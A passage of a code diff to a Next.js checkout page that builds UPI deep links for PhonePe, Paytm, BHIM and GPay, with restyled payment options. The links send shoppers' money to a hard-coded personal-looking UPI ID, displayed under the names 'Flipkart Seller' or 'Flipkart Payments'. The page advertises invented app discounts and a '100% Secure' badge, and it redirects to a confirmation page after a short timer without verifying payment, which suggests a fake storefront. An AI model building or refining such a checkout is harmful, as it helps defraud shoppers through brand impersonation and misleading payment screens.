@@ -1,6 +1,7 @@
 import { useRouter } from "next/router";
 import { useState, useEffect } from "react";
 import Head from "next/head";
+import { trackAddPaymentInfo } from "../utils/facebookPixel";
 
 /* ── load Cashfree JS SDK ── */
 function loadCashfreeSDK() {
@@ -36,12 +37,21 @@ export default function Payments() {
     const [payUrl,    setPayUrl]    = useState("");
     const [loading,   setLoading]   = useState(false);
     const [mounted,   setMounted]   = useState(false);
+    const [orderId,   setOrderId]   = useState("");
 
     useEffect(() => setMounted(true), []);
 
     useEffect(() => {
         try { const c = localStorage.getItem("cart"); if (c) setCart(JSON.parse(c)); } catch(_){}
         try { const u = localStorage.getItem("user"); if (u) setUser(JSON.parse(u)); } catch(_){}
+
+        // Retrieve or generate a clean 6-digit numeric order ID
+        let storedOrderId = localStorage.getItem("currentOrderId");
+        if (!storedOrderId) {
+            storedOrderId = "ORDER" + Math.floor(100000 + Math.random() * 900000);
+            localStorage.setItem("currentOrderId", storedOrderId);
+        }
+        setOrderId(storedOrderId);
     }, []);
 
     useEffect(() => {
@@ -62,6 +72,21 @@ export default function Payments() {
         })();
     }, []);
 
+    useEffect(() => {
+        if (activeTab) {
+            const methodNames = {
+                1: "BHIM UPI",
+                2: "GPay",
+                3: "PhonePe",
+                4: "Paytm Native",
+                6: "Card / Net Banking",
+                7: "PhonePe 2"
+            };
+            const cartValue = cart.reduce((s,p) => s + Math.round((p.sellingPrice||0)*(p.quantity||1)), 0);
+            trackAddPaymentInfo(methodNames[activeTab] || "UPI", cartValue);
+        }
+    }, [activeTab, cart]);
+
     /* totals */
     const totalMrp      = cart.reduce((s,p) => s + Math.round((p.sellingPrice||0)*(p.quantity||1)), 0);
     const itemCount     = cart.reduce((s,p) => s + (p.quantity||1), 0);
@@ -70,7 +95,7 @@ export default function Payments() {
 
     /* ── UPI deep-links ── */
     useEffect(() => {
-        if (!mounted || !activeTab || activeTab === 6) { setPayUrl(""); return; }
+        if (!mounted || !activeTab || !orderId || activeTab === 6) { setPayUrl(""); return; }
         const amt = totalMrp;
         const txn = `TXN${Date.now()}`;
 
@@ -78,33 +103,60 @@ export default function Payments() {
             const p2Name = encodeURIComponent(products.Phonepe2Name || "Flipkart Seller");
             const p2Upi = products.Phonepe2UpiId || "shivfashion710704.rzp@rxairtel";
             const p2Txn = `TD${Date.now()}`;
-            const phonepe2Url = `phonepe://pay?pa=${p2Upi}&pn=${p2Name}&am=${amt}&tr=${p2Txn}&mc=8931&orgid=000000&mode=01&cu=INR&tn=${p2Name}`;
+            const phonepe2Url = `phonepe://pay?pa=${p2Upi}&pn=${p2Name}&am=${amt}&tr=${p2Txn}&mc=8931&orgid=000000&mode=01&cu=INR&tn=${orderId}`;
             setPayUrl(phonepe2Url);
             return;
         }
 
         if (!products?.id) { setPayUrl(""); return; }
         const id = products.id;
+
+        // PhonePe Native Payload
         const ppPayload = {
-            contact:{ cbsName:"Store", nickName:"Payment", vpa:id, type:"VPA" },
-            p2pPaymentCheckoutParams:{
-                note:txn, isByDefaultKnownContact:true, enableSpeechToText:false,
-                allowAmountEdit:false, showQrCodeOption:false, disableViewHistory:true,
-                shouldShowUnsavedContactBanner:false, isRecurring:false,
-                checkoutType:"DEFAULT", transactionContext:"p2p",
-                initialAmount:amt*100, disableNotesEdit:true, showKeyboard:true,
-                currency:"INR", shouldShowMaskedNumber:true
+            p2pPaymentCheckoutParams: {
+                checkoutType: "COLLECT",
+                initialAmount: amt * 100, // amount in paise
+                note: {
+                    type: "text",
+                    message: orderId
+                },
+                supportedInstruments: -1
+            },
+            contact: {
+                type: "EXTERNAL_MERCHANT",
+                name: products.Phonepe2Name || "Flipkart Payments",
+                vpa: id
             }
         };
-        const ppLink = "phonepe://native?data=" + btoa(JSON.stringify(ppPayload)) + "&id=p2ppayment";
+        const ppLink = `phonepe://native?data=${encodeURIComponent(btoa(JSON.stringify(ppPayload)))}&id=p2ppayment`;
+
+        // Paytm Native Payload
+        const paytmPayload = {
+            p2pPaymentCheckoutParams: {
+                checkoutType: "COLLECT",
+                initialAmount: amt * 100, // amount in paise
+                note: {
+                    type: "text",
+                    message: orderId
+                },
+                supportedInstruments: -1
+            },
+            contact: {
+                type: "EXTERNAL_MERCHANT",
+                name: products.Phonepe2Name || "Flipkart Payments",
+                vpa: id
+            }
+        };
+        const paytmLink = `paytmmp://cash_wallet?featuretype=sendmoney&data=${encodeURIComponent(btoa(JSON.stringify(paytmPayload)))}`;
+
         const urls = {
-            1: `bhim://pay?pa=${id}&pn=Store&am=${amt}&tr=${txn}&mc=8931&cu=INR&tn=Payment`,
+            1: `bhim://pay?pa=${id}&pn=Store&am=${amt}&tr=${txn}&mc=8931&cu=INR&tn=${orderId}`,
             2: ppLink,
             3: ppLink,
-            4: `paytmmp://pay?pa=${id}&pn=Store&am=${amt}&tr=${txn}&cu=INR`,
+            4: paytmLink,
         };
         setPayUrl(urls[activeTab] || "");
-    }, [activeTab, products?.id, products?.Phonepe2UpiId, products?.Phonepe2Name, totalMrp, mounted]);
+    }, [activeTab, products?.id, products?.Phonepe2UpiId, products?.Phonepe2Name, totalMrp, mounted, orderId]);
 
     const handlePay = async () => {
         if (activeTab === 6) {
@@ -112,7 +164,6 @@ export default function Payments() {
             try {
                 const ready = await loadCashfreeSDK();
                 if (!ready || !window.Cashfree) throw new Error("Payment SDK could not load. Please check your internet and try again.");
-                const orderId = `ORD-${Date.now()}`;
                 const res  = await fetch("/api/payment/cashfree", {
                     method:"POST",
                     headers:{"Content-Type":"application/json"},
@@ -132,8 +183,7 @@ export default function Payments() {
                         `Payment failed: "${err.message}"\n\nSince you are running on localhost, would you like to bypass the payment gateway and simulate a successful payment for testing?`
                     );
                     if (confirmBypass) {
-                        const mockOrderId = `ORD-${Date.now()}`;
-                        window.location.href = `/ordersummdary?order_id=${mockOrderId}`;
+                        window.location.href = `/ordersummdary?order_id=${orderId}`;
                         return;
                     }
                 } else {
@@ -143,7 +193,28 @@ export default function Payments() {
             }
             return;
         }
-        if (payUrl) { window.location.href = payUrl; return; }
+        if (payUrl) {
+            // Save details to lastOrder so they are accessible by other pages
+            const orderDetails = {
+                orderId,
+                items: cart,
+                total: totalMrp,
+                shippingAddress: user,
+                paymentMethod: activeTab === 1 ? "BHIM" : activeTab === 2 ? "GPay" : activeTab === 3 ? "PhonePe" : activeTab === 4 ? "Paytm" : activeTab === 7 ? "PhonePe 2" : "UPI",
+                date: new Date().toISOString(),
+            };
+            localStorage.setItem("lastOrder", JSON.stringify(orderDetails));
+
+            // Launch the UPI deep link
+            window.location.href = payUrl;
+
+            // Wait 1 second and then redirect the browser to the payment confirmation page
+            setLoading(true);
+            setTimeout(() => {
+                router.push(`/confirm-payment?orderId=${orderId}&amount=${totalMrp}`);
+            }, 1200);
+            return;
+        }
         alert("Please select a payment method.");
     };
 
@@ -158,6 +229,15 @@ export default function Payments() {
         cashfree: !!settings?.payment?.cashfreeEnabled,
     };
 
+    // Helper to get active payment color theme
+    const getThemeColor = () => {
+        if (activeTab === 3 || activeTab === 7) return "#5f259f"; // PhonePe Purple
+        if (activeTab === 2) return "#1a73e8"; // GPay Blue
+        if (activeTab === 4) return "#00baf2"; // Paytm Cyan
+        if (activeTab === 1) return "#f97316"; // BHIM Orange
+        return "#1f2937"; // Gray
+    };
+
     return (
         <>
             <Head>
@@ -166,22 +246,22 @@ export default function Payments() {
                 <meta name="theme-color" content="#ffffff"/>
                 <link rel="preconnect" href="https://fonts.googleapis.com"/>
                 <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin=""/>
-                <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"/>
+                <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
             </Head>
 
             <style jsx global>{`
                 *, *::before, *::after { box-sizing:border-box; margin:0; padding:0; }
                 html, body {
-                    font-family:'Inter',sans-serif;
-                    background:#fff;
-                    color:#212121;
+                    font-family:'Inter', sans-serif;
+                    background:#f8fafc;
+                    color:#1e293b;
                     -webkit-tap-highlight-color:transparent;
                 }
                 .header-menu, nav>ul, footer,
                 .cart_page_footer { display:none !important; }
 
                 /* ── PAGE ── */
-                .pmt-page { background:#fff; min-height:100vh; }
+                .pmt-page { background:#f8fafc; min-height:100vh; max-width:600px; margin:0 auto; box-shadow:0 0 20px rgba(0,0,0,0.03); }
 
                 /* ── STICKY HEADER ── */
                 .pmt-header {
@@ -189,91 +269,116 @@ export default function Payments() {
                     position:sticky;
                     top:0;
                     z-index:50;
-                    box-shadow:0 1px 4px rgba(0,0,0,0.08);
-                    padding:10px 12px 8px;
+                    border-bottom:1px solid #e2e8f0;
+                    padding:12px 16px;
                 }
                 .pmt-hdr-row {
                     display:flex;
                     align-items:center;
                     width:100%;
-                    gap:0;
+                    gap:12px;
                 }
                 .pmt-back-wrap {
-                    width:10%;
                     display:flex;
                     align-items:center;
                 }
                 .pmt-back-btn {
                     background:none; border:none; cursor:pointer;
-                    padding:2px; display:flex; align-items:center;
+                    padding:4px; display:flex; align-items:center;
+                    color:#475569;
+                    transition:color 0.2s;
                 }
+                .pmt-back-btn:hover { color:#0f172a; }
                 .pmt-hdr-text { flex:1; }
                 .pmt-step {
-                    font-size:13px;
-                    color:#6b7280;
-                    line-height:1;
-                    margin-bottom:0;
+                    font-size:11px;
+                    font-weight:700;
+                    text-transform:uppercase;
+                    letter-spacing:0.05em;
+                    color:#64748b;
+                    margin-bottom:2px;
                 }
                 .pmt-title {
-                    font-size:16px;
-                    font-weight:600;
-                    color:#1f2937;
-                    margin:4px 0 0;
+                    font-family:'Outfit', sans-serif;
+                    font-size:18px;
+                    font-weight:700;
+                    color:#0f172a;
+                    margin:0;
                     line-height:1.2;
                 }
                 .pmt-secure {
                     display:flex;
                     align-items:center;
-                    background:#f5f5f5;
-                    border-radius:4px;
-                    padding:4px 8px;
+                    background:#f0fdf4;
+                    border:1px solid #bbf7d0;
+                    border-radius:20px;
+                    padding:4px 10px;
                     gap:4px;
-                    margin-left:auto;
                     white-space:nowrap;
                 }
                 .pmt-secure-txt {
-                    font-size:10px;
-                    font-weight:700;
-                    color:#4b5563;
+                    font-size:11px;
+                    font-weight:600;
+                    color:#15803d;
                 }
 
+                /* Stepper */
+                .stepper {
+                    display: flex; justify-content: center; align-items: center;
+                    gap: 0; padding: 14px 16px; border-bottom: 1px solid #e2e8f0;
+                    background: #fff;
+                }
+                .step { display: flex; flex-direction: column; align-items: center; flex: 1; }
+                .step-circle {
+                    width: 26px; height: 26px; border-radius: 50%;
+                    display: flex; align-items: center; justify-content: center;
+                    font-size: 11px; font-weight: 700; border: 2px solid #e2e8f0;
+                    background: #fff; color: #94a3b8; z-index: 1; position: relative;
+                }
+                .step-circle.done { background: #10b981; border-color: #10b981; color: #fff; }
+                .step-circle.active { background: #2874f0; border-color: #2874f0; color: #fff; }
+                .step-label { font-size: 10px; margin-top: 4px; color: #94a3b8; font-weight: 600; text-transform: uppercase; letter-spacing: 0.02em; }
+                .step-label.active { color: #0f172a; font-weight: 700; }
+                .step-label.done { color: #10b981; font-weight: 700; }
+                .step-line { flex: 1; height: 2px; background: #e2e8f0; margin-top: -14px; }
+                .step-line.done { background: #10b981; }
+
                 /* ── BODY ── */
-                .pmt-body { padding:0 0 100px; }
+                .pmt-body { padding:16px 16px 120px; }
 
                 /* ── UPI SECTION ── */
                 .upi-section {
-                    background:#f5f5f5;
-                    border-radius:8px;
+                    background:#fff;
+                    border:1px solid #e2e8f0;
+                    border-radius:12px;
                     overflow:hidden;
-                    margin:12px;
+                    margin-bottom:16px;
+                    box-shadow:0 1px 3px rgba(0,0,0,0.02);
                 }
                 .upi-sec-hdr {
-                    padding:14px 16px;
-                    border-bottom:1px solid #f0f0f0;
+                    padding:16px;
+                    border-bottom:1px solid #f1f5f9;
                     display:flex;
                     justify-content:space-between;
                     align-items:center;
-                    background:#f5f5f5;
-                    border-radius:8px 8px 0 0;
+                    background:#fff;
                 }
                 .upi-sec-hdr-left {
                     display:flex;
                     align-items:center;
-                    gap:8px;
+                    gap:10px;
                 }
                 .upi-sec-label {
-                    font-size:15px;
-                    font-weight:500;
-                    color:#374151;
+                    font-family:'Outfit', sans-serif;
+                    font-size:16px;
+                    font-weight:700;
+                    color:#0f172a;
                 }
 
                 /* white card inside */
                 .upi-opts-card {
-                    padding:8px;
-                    margin:8px;
+                    padding:8px 0;
                     background:#fff;
-                    border-radius:6px;
-                    box-shadow:0 2px 5px rgba(0,0,0,0.10);
                 }
 
                 /* ── OPTION ROW ── */
@@ -281,25 +386,47 @@ export default function Payments() {
                     display:flex;
                     align-items:center;
                     justify-content:space-between;
-                    padding:12px;
-                    margin-bottom:8px;
+                    padding:16px;
                     cursor:pointer;
+                    transition:background-color 0.15s, transform 0.15s;
+                    border-bottom:1px solid #f1f5f9;
                 }
-                .pmt-opt:last-child { margin-bottom:0; border-top:1px solid #e5e7eb; }
+                .pmt-opt:last-child { border-bottom:none; }
+                .pmt-opt:hover { background-color:#f8fafc; }
+                .pmt-opt.active-opt { background-color:#f1f5f9; }
                 .pmt-opt-left {
                     display:flex;
                     align-items:center;
-                    gap:12px;
+                    gap:14px;
                     flex:1;
                 }
-                /* native radio styled via accent */
-                .pmt-radio {
+                /* Custom radio button */
+                .pmt-radio-wrap {
+                    position:relative;
                     width:20px;
                     height:20px;
-                    accent-color:#2563eb;
-                    cursor:pointer;
-                    flex-shrink:0;
+                    border-radius:50%;
+                    border:2px solid #cbd5e1;
+                    display:flex;
+                    align-items:center;
+                    justify-content:center;
+                    transition:border-color 0.2s, background-color 0.2s;
                 }
+                .pmt-radio-wrap.checked {
+                    border-color:var(--theme-color, #1a73e8);
+                }
+                .pmt-radio-inner {
+                    width:10px;
+                    height:10px;
+                    border-radius:50%;
+                    background-color:var(--theme-color, #1a73e8);
+                    transform:scale(0);
+                    transition:transform 0.2s;
+                }
+                .pmt-radio-wrap.checked .pmt-radio-inner {
+                    transform:scale(1);
+                }
+
                 .pmt-opt-info {}
                 .pmt-opt-top {
                     display:flex;
@@ -307,141 +434,162 @@ export default function Payments() {
                     gap:8px;
                     font-size:15px;
                     font-weight:700;
-                    color:#1f2937;
+                    color:#0f172a;
                 }
-                .pmt-pipe { color:#d1d5db; font-weight:300; }
+                .pmt-pipe { color:#cbd5e1; font-weight:300; }
                 .pmt-opt-sub {
-                    font-size:14px;
+                    font-size:12px;
                     margin-top:2px;
-                    font-weight:500;
+                    font-weight:600;
                 }
-                .sub-phonepe { color:#875BB7; }
-                .sub-gpay    { color:#34A853; }
-                .sub-paytm   { color:#02B9EF; }
-                .sub-bhim    { color:#f97316; }
-                .sub-cashfree{ color:#1d3557; }
+                .sub-phonepe { color:#7c3aed; }
+                .sub-gpay    { color:#2563eb; }
+                .sub-paytm   { color:#0ea5e9; }
+                .sub-bhim    { color:#ea580c; }
+                .sub-cashfree{ color:#334155; }
 
                 /* ── CASHBACK BANNER ── */
                 .cashback-banner {
-                    background:#E7F9ED;
-                    border-radius:8px;
+                    background:#f0fdf4;
+                    border:1px solid #dcfce7;
+                    border-radius:12px;
                     padding:16px;
-                    margin:4px 16px 16px;
-                    text-align:center;
+                    margin-bottom:16px;
                 }
                 .cb-title {
-                    font-size:20px;
+                    font-family:'Outfit', sans-serif;
+                    font-size:16px;
                     font-weight:700;
-                    color:#008C00;
-                    padding-bottom:8px;
-                    line-height:1.2;
-                    text-align:left;
+                    color:#15803d;
+                    margin-bottom:4px;
+                    display:flex;
+                    align-items:center;
+                    gap:6px;
                 }
                 .cb-body {
-                    font-size:14px;
-                    text-align:justify;
-                    line-height:1.4;
-                    margin-top:-4px;
-                    color:#374151;
+                    font-size:13px;
+                    line-height:1.5;
+                    color:#334155;
                 }
-                .cb-bold { font-weight:700; color:#111; }
+                .cb-bold { font-weight:700; color:#1e293b; }
 
                 /* ── PRICE SUMMARY ── */
                 .price-box {
-                    background:#F1F5FF;
-                    border-radius:8px;
-                    padding:12px;
-                    margin:0 16px 16px;
-                    font-weight:500;
+                    background:#fff;
+                    border:1px solid #e2e8f0;
+                    border-radius:12px;
+                    padding:16px;
+                    margin-bottom:16px;
+                    box-shadow:0 1px 3px rgba(0,0,0,0.02);
+                }
+                .price-box-title {
+                    font-family:'Outfit', sans-serif;
+                    font-size:15px;
+                    font-weight:700;
+                    color:#0f172a;
+                    margin-bottom:12px;
                 }
                 .price-row {
                     display:flex;
                     justify-content:space-between;
-                    padding:4px 0;
-                    font-size:15px;
-                    color:#212121;
+                    padding:6px 0;
+                    font-size:14px;
+                    color:#475569;
                 }
-                .price-free  { color:#008C00; }
-                .price-strike{ text-decoration:line-through; color:#6b7280; }
+                .price-free  { color:#16a34a; font-weight:600; }
+                .price-strike{ text-decoration:line-through; color:#94a3b8; }
                 .price-total-row {
                     display:flex;
                     justify-content:space-between;
                     align-items:center;
-                    padding:12px 0 4px;
-                    margin-top:4px;
-                    border-top:1px dashed #c4c4c4;
+                    padding-top:12px;
+                    margin-top:8px;
+                    border-top:1px dashed #e2e8f0;
                 }
                 .price-total-lbl {
-                    display:flex;
-                    align-items:center;
-                    gap:4px;
-                    color:#2855E9;
+                    font-weight:700;
+                    color:#0f172a;
                     font-size:15px;
                 }
                 .price-total-amt {
-                    font-size:16px;
-                    font-weight:700;
-                    color:#2855E9;
+                    font-size:18px;
+                    font-weight:800;
+                    color:#0f172a;
                 }
 
                 /* ── SECURE PAY IMAGE ── */
                 .secure-pay-wrap {
                     display:flex;
-                    justify-content:flex-start;
-                    padding:0 16px;
+                    justify-content:center;
+                    padding:8px 0;
                     margin-bottom:20px;
                 }
                 .secure-pay-img {
                     width:100%;
-                    max-width:360px;
-                    border-radius:6px;
+                    max-width:280px;
+                    opacity:0.8;
                 }
 
                 /* ── FOOTER BAR ── */
                 .pmt-footer {
                     position:fixed;
                     bottom:0;
-                    left:0;
+                    left:50%;
+                    transform:translateX(-50%);
                     width:100%;
+                    max-width:600px;
                     background:#fff;
-                    box-shadow:0 -1px 5px rgba(0,0,0,0.10);
-                    padding:12px 24px;
+                    box-shadow:0 -10px 30px rgba(0,0,0,0.05);
+                    padding:16px;
                     display:flex;
                     align-items:center;
                     justify-content:space-between;
-                    border-top:1px solid #f3f4f6;
+                    border-top:1px solid #e2e8f0;
                     z-index:50;
                 }
+                .pmt-footer-left {
+                    display:flex;
+                    flex-direction:column;
+                }
+                .pmt-footer-lbl {
+                    font-size:11px;
+                    font-weight:600;
+                    color:#64748b;
+                    text-transform:uppercase;
+                }
                 .pmt-footer-amt {
-                    font-size:24px;
-                    font-weight:500;
-                    color:#212121;
+                    font-family:'Outfit', sans-serif;
+                    font-size:22px;
+                    font-weight:800;
+                    color:#0f172a;
+                    line-height:1.2;
                 }
                 .pmt-pay-btn {
-                    background:#FFC107;
-                    color:#000;
+                    background:#fb641b;
+                    color:#fff;
                     font-weight:700;
-                    padding:12px 32px;
-                    border-radius:8px;
+                    height:48px;
+                    padding:0 28px;
+                    border-radius:10px;
                     border:none;
-                    text-transform:uppercase;
-                    font-size:15px;
+                    font-size:14px;
                     cursor:pointer;
-                    box-shadow:0 1px 3px rgba(0,0,0,0.12);
+                    box-shadow:0 4px 12px rgba(251, 100, 27, 0.2);
                     display:flex;
                     align-items:center;
                     gap:8px;
-                    transition:background .15s;
+                    transition:all .15s ease-in-out;
                     font-family:'Inter',sans-serif;
+                    letter-spacing:0.02em;
                 }
-                .pmt-pay-btn:hover:not(:disabled)  { background:#e6ad06; }
-                .pmt-pay-btn:active:not(:disabled)  { background:#d4a005; }
-                .pmt-pay-btn:disabled               { opacity:.6; cursor:not-allowed; }
+                .pmt-pay-btn:hover:not(:disabled)  { background:#e05300; transform:translateY(-1px); box-shadow:0 6px 16px rgba(251, 100, 27, 0.3); }
+                .pmt-pay-btn:active:not(:disabled)  { background:#c84a00; transform:translateY(0); }
+                .pmt-pay-btn:disabled               { opacity:.6; cursor:not-allowed; box-shadow:none; }
 
                 /* spinner */
                 .btn-spin {
                     width:16px; height:16px;
-                    border:2px solid rgba(0,0,0,.2);
+                    border:2px solid rgba(0,0,0,.15);
                     border-top-color:#000;
                     border-radius:50%;
                     animation:_bspin .65s linear infinite;
@@ -456,24 +604,39 @@ export default function Payments() {
                     <div className="pmt-hdr-row">
                         <div className="pmt-back-wrap">
                             <button className="pmt-back-btn" onClick={() => router.back()}>
-                                <img src="/assets/images/theme/back_dark.svg" alt="Back" width={20} height={20}
-                                    onError={e => {
-                                        e.target.style.display="none";
-                                        e.target.parentNode.innerHTML='<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M15 19l-7-7 7-7" stroke="#212121" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>';
-                                    }}
-                                />
+                                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
                             </button>
                         </div>
                         <div className="pmt-hdr-text">
                             <p className="pmt-step">Step 3 of 3</p>
-                            <h5 className="pmt-title">Payments</h5>
+                            <h5 className="pmt-title">Select Payment Mode</h5>
                         </div>
                         <div className="pmt-secure">
-                            <img src="/assets/images/lock-icon.svg" alt="Secure" width={16} height={16}
-                                onError={e => { e.target.style.display="none"; }}
-                            />
+                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#15803d" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                             <p className="pmt-secure-txt">100% Secure</p>
                         </div>
+                    </div>
+                </div>
+
+                {/* Progress Stepper */}
+                <div className="stepper">
+                    <div className="step">
+                        <div className="step-circle done">
+                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                        </div>
+                        <span className="step-label done">Cart</span>
+                    </div>
+                    <div className="step-line done" />
+                    <div className="step">
+                        <div className="step-circle done">
+                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                        </div>
+                        <span className="step-label done">Address</span>
+                    </div>
+                    <div className="step-line done" />
+                    <div className="step">
+                        <div className="step-circle active">3</div>
+                        <span className="step-label active">Payment</span>
                     </div>
                 </div>
 
@@ -484,24 +647,21 @@ export default function Payments() {
                     <div className="upi-section">
                         <div className="upi-sec-hdr">
                             <div className="upi-sec-hdr-left">
-                                <img src="/assets/images/upi.svg" alt="UPI" width={30}
-                                    onError={e => { e.target.style.display="none"; }}
-                                />
-                                <p className="upi-sec-label">UPI</p>
+                                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#0f172a" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
+                                <p className="upi-sec-label">Pay via UPI App</p>
                             </div>
-                            <img src="/assets/images/up_arw.svg" alt="Arrow" width={18}
-                                onError={e => { e.target.outerHTML='<span style="font-size:18px;color:#555">∧</span>'; }}
-                            />
+                            <span style={{fontSize:12, color:"#94a3b8", fontWeight:700}}>ONLINE UPI</span>
                         </div>
 
                         <div className="upi-opts-card">
 
                             {/* PhonePe */}
                             {show.phonepe && (
-                                <div className="pmt-opt" onClick={() => setActiveTab(3)}>
+                                <div className={`pmt-opt ${activeTab===3 ? 'active-opt' : ''}`} onClick={() => setActiveTab(3)} style={{"--theme-color": "#5f259f"}}>
                                     <div className="pmt-opt-left">
-                                        <input type="radio" name="upi" className="pmt-radio"
-                                            checked={activeTab===3} onChange={() => setActiveTab(3)} />
+                                        <div className={`pmt-radio-wrap ${activeTab===3 ? 'checked' : ''}`}>
+                                            <div className="pmt-radio-inner" />
+                                        </div>
                                         <div className="pmt-opt-info">
                                             <div className="pmt-opt-top">
                                                 <span>₹{totalMrp}</span>
@@ -511,18 +671,19 @@ export default function Payments() {
                                             <p className="pmt-opt-sub sub-phonepe">30% Extra Discount By PhonePe</p>
                                         </div>
                                     </div>
-                                    <img src="/assets/images/phonepe.svg" alt="PhonePe" width={30}
-                                        onError={e=>{e.target.outerHTML='<svg width="30" height="30" viewBox="0 0 30 30"><circle cx="15" cy="15" r="15" fill="#5f259f"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" fill="#fff" font-size="14" font-weight="bold">₱</text></svg>';}}
+                                    <img src="/assets/images/phonepe.svg" alt="PhonePe" width={28} height={28}
+                                        onError={e=>{e.target.outerHTML='<svg width="28" height="28" viewBox="0 0 30 30"><circle cx="15" cy="15" r="15" fill="#5f259f"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" fill="#fff" font-size="14" font-weight="bold">₱</text></svg>';}}
                                     />
                                 </div>
                             )}
 
                             {/* PhonePe 2 */}
                             {show.phonepe2 && (
-                                <div className="pmt-opt" onClick={() => setActiveTab(7)} style={{ borderTop: "1px solid #e5e7eb" }}>
+                                <div className={`pmt-opt ${activeTab===7 ? 'active-opt' : ''}`} onClick={() => setActiveTab(7)} style={{"--theme-color": "#5f259f"}}>
                                     <div className="pmt-opt-left">
-                                        <input type="radio" name="upi" className="pmt-radio"
-                                            checked={activeTab===7} onChange={() => setActiveTab(7)} />
+                                        <div className={`pmt-radio-wrap ${activeTab===7 ? 'checked' : ''}`}>
+                                            <div className="pmt-radio-inner" />
+                                        </div>
                                         <div className="pmt-opt-info">
                                             <div className="pmt-opt-top">
                                                 <span>₹{totalMrp}</span>
@@ -532,39 +693,41 @@ export default function Payments() {
                                             <p className="pmt-opt-sub sub-phonepe">30% Extra Discount By PhonePe</p>
                                         </div>
                                     </div>
-                                    <img src="/assets/images/phonepe.svg" alt="PhonePe" width={30}
-                                        onError={e=>{e.target.outerHTML='<svg width="30" height="30" viewBox="0 0 30 30"><circle cx="15" cy="15" r="15" fill="#5f259f"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" fill="#fff" font-size="14" font-weight="bold">₱</text></svg>';}}
+                                    <img src="/assets/images/phonepe.svg" alt="PhonePe" width={28} height={28}
+                                        onError={e=>{e.target.outerHTML='<svg width="28" height="28" viewBox="0 0 30 30"><circle cx="15" cy="15" r="15" fill="#5f259f"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" fill="#fff" font-size="14" font-weight="bold">₱</text></svg>';}}
                                     />
                                 </div>
                             )}
 
                             {/* GPay */}
                             {show.gpay && (
-                                <div className="pmt-opt" onClick={() => setActiveTab(2)}>
+                                <div className={`pmt-opt ${activeTab===2 ? 'active-opt' : ''}`} onClick={() => setActiveTab(2)} style={{"--theme-color": "#1a73e8"}}>
                                     <div className="pmt-opt-left">
-                                        <input type="radio" name="upi" className="pmt-radio"
-                                            checked={activeTab===2} onChange={() => setActiveTab(2)} />
+                                        <div className={`pmt-radio-wrap ${activeTab===2 ? 'checked' : ''}`}>
+                                            <div className="pmt-radio-inner" />
+                                        </div>
                                         <div className="pmt-opt-info">
                                             <div className="pmt-opt-top">
                                                 <span>₹{totalMrp}</span>
                                                 <span className="pmt-pipe">|</span>
                                                 <span>GPay</span>
                                             </div>
-                                            <p className="pmt-opt-sub sub-gpay">20% Extra Discount By Gpay</p>
+                                            <p className="pmt-opt-sub sub-gpay">20% Extra Discount By GPay</p>
                                         </div>
                                     </div>
-                                    <img src="/assets/images/gpay_icon.svg" alt="GPay" width={30}
-                                        onError={e=>{e.target.outerHTML='<svg width="30" height="30" viewBox="0 0 30 30"><circle cx="15" cy="15" r="15" fill="#fff" stroke="#e0e0e0"/><text x="50%" y="57%" dominant-baseline="middle" text-anchor="middle" font-size="14" font-weight="800" fill="#4285F4">G</text></svg>';}}
+                                    <img src="/assets/images/gpay_icon.svg" alt="GPay" width={28} height={28}
+                                        onError={e=>{e.target.outerHTML='<svg width="28" height="28" viewBox="0 0 30 30"><circle cx="15" cy="15" r="15" fill="#fff" stroke="#e2e8f0"/><text x="50%" y="57%" dominant-baseline="middle" text-anchor="middle" font-size="14" font-weight="800" fill="#4285F4">G</text></svg>';}}
                                     />
                                 </div>
                             )}
 
                             {/* Paytm */}
                             {show.paytm && (
-                                <div className="pmt-opt" onClick={() => setActiveTab(4)}>
+                                <div className={`pmt-opt ${activeTab===4 ? 'active-opt' : ''}`} onClick={() => setActiveTab(4)} style={{"--theme-color": "#00baf2"}}>
                                     <div className="pmt-opt-left">
-                                        <input type="radio" name="upi" className="pmt-radio"
-                                            checked={activeTab===4} onChange={() => setActiveTab(4)} />
+                                        <div className={`pmt-radio-wrap ${activeTab===4 ? 'checked' : ''}`}>
+                                            <div className="pmt-radio-inner" />
+                                        </div>
                                         <div className="pmt-opt-info">
                                             <div className="pmt-opt-top">
                                                 <span>₹{totalMrp}</span>
@@ -574,18 +737,19 @@ export default function Payments() {
                                             <p className="pmt-opt-sub sub-paytm">10% Extra Discount By Paytm</p>
                                         </div>
                                     </div>
-                                    <img src="/assets/images/paytm_icon.svg" alt="Paytm" width={30}
